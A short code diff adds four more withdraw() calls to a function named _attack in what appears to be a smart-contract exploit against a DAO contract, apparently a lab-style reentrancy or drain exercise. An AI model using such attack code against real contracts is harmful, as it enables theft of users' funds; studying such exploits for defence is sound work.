@@ -21,6 +21,10 @@ def _attack() -> bool:
     #if (userBalances(self.dao_address) >= 
     
     DAO(self.dao_address).withdraw()
+    DAO(self.dao_address).withdraw()
+    DAO(self.dao_address).withdraw()
+    DAO(self.dao_address).withdraw()
+    DAO(self.dao_address).withdraw()
 
     return True
 
